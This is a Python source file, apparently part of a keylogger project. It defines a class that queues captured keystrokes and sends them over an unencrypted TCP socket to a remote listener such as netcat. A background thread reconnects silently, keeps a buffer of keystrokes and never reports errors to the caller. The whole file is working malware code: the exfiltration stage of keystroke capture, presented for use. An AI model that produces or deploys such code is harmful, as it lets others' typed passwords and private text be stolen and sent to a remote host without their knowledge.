"""Ships encoded keystroke lines over a plain TCP socket.

No encryption, no framing beyond newline-delimited text -- this phase is
about proving the capture -> transport path with netcat on the far end.

Design notes:
  * A background thread owns the socket and drains a queue, so the keyboard
    callback never blocks on the network (pynput warns that blocking in the
    callback can freeze input for every process).
  * The connection is lazy and self-healing: if the Linux listener isn't up
    yet, or drops, the sender keeps retrying in the background and buffers a
    bounded number of recent keystrokes. It never raises into the caller.
"""

from __future__ import annotations

import queue
import socket
import threading
import time


class KeystrokeSender:
    def __init__(
        self,
        host: str,
        port: int,
        max_queue: int = 1000,
        reconnect_delay: float = 1.0,
    ) -> None:
        self.host = host
        self.port = port
        self.reconnect_delay = reconnect_delay

        self._queue: queue.Queue[str] = queue.Queue(maxsize=max_queue)
        self._sock: socket.socket | None = None
        self._stop = threading.Event()
        self._connected = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    @property
    def is_connected(self) -> bool:
        return self._connected.is_set()

    def start(self) -> None:
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:
                pass

    def send_line(self, line: str) -> None:
        """Enqueue one wire line (without trailing newline). Non-blocking;
        drops the oldest queued item if the buffer is full rather than
        blocking the keyboard callback."""
        try:
            self._queue.put_nowait(line)
        except queue.Full:
            try:
                self._queue.get_nowait()
                self._queue.put_nowait(line)
            except (queue.Empty, queue.Full):
                pass

    def _run(self) -> None:
        while not self._stop.is_set():
            if self._sock is None:
                self._try_connect()
                if self._sock is None:
                    time.sleep(self.reconnect_delay)
                    continue

            # Block for the first line, then drain everything else that's
            # already queued. Under fast typing this coalesces a burst into a
            # single sendall of whole, newline-terminated lines -- so the
            # receiver never sees a partial line spliced across two writes,
            # and we issue one network write per burst instead of one per
            # keystroke.
            try:
                first = self._queue.get(timeout=0.2)
            except queue.Empty:
                continue

            lines = [first]
            try:
                while True:
                    lines.append(self._queue.get_nowait())
            except queue.Empty:
                pass

            payload = "".join(line + "\n" for line in lines).encode("utf-8")
            try:
                self._sock.sendall(payload)
            except OSError:
                # Connection lost; requeue this burst (in order) and reconnect.
                self._connected.clear()
                self._close_sock()
                for line in lines:
                    self.send_line(line)

    def _try_connect(self) -> None:
        try:
            s = socket.create_connection((self.host, self.port), timeout=3.0)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self._sock = s
            self._connected.set()
        except OSError:
            self._sock = None
            self._connected.clear()

    def _close_sock(self) -> None:
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None
